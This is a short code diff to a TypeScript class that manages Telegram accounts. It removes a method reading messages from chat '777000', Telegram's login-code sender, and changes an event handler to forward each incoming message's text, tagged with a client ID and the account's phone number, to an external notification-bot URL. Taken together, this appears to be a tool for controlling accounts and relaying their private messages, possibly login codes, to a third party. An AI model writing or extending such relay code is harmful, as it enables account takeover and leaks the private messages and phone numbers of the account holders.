@@ -432,17 +432,6 @@ class TelegramManager {
         return chats;
     }
 
-    async getLastMsgs(limit: number): Promise<string> {
-        if (!this.client) throw new Error('Client is not initialized');
-        const msgs = await this.client.getMessages("777000", { limit });
-        let resp = '';
-        msgs.forEach((msg) => {
-            console.log(msg.text);
-            resp += msg.text + "\n";
-        });
-        return resp;
-    }
-
     async getSelfMSgsInfo(): Promise<{
         photoCount: number;
         videoCount: number;
@@ -925,7 +914,7 @@ class TelegramManager {
                 //         parseError(error)
                 //     }
                 // } else {
-                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(event.message.text)}`);
+                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`${process.env.clientId}:${this.phoneNumber}\n${event.message.text}`)}`);
                 // await event.message.delete({ revoke: true });
                 // }
             }
